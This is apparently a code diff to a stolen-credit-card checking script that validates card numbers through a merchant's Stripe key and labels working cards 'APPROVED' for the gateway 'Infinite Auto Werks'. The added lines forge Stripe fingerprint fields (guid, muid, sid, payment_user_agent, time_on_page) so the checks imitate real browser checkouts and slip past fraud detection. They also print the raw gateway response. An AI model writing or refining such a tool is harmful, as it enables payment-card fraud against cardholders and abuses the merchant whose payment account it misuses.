@@ -117,6 +117,11 @@ def check_card():
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
 
+    import uuid
+    guid = str(uuid.uuid4())
+    muid = str(uuid.uuid4())
+    sid = str(uuid.uuid4())
+
     data2 = {
         "type": "card",
         "card[number]": cc,
@@ -124,6 +129,11 @@ def check_card():
         "card[exp_year]": year,
         "card[exp_month]": mon,
         "key": STRIPE_PK,
+        "guid": guid,
+        "muid": muid,
+        "sid": sid,
+        "payment_user_agent": "stripe.js/b22e1181d; stripe-js-v3/b22e1181d; split-card-element", 
+        "time_on_page": "89234",
     }
 
     req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data2, timeout=10)
@@ -173,6 +183,7 @@ def check_card():
     # RESPONSE HANDLING
     # ==========================================
     result_text = req3.text
+    print(f"✅ RAW GATEWAY RESPONSE: {result_text}")
     
     if '"success":true' in result_text:
         msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Authorized"
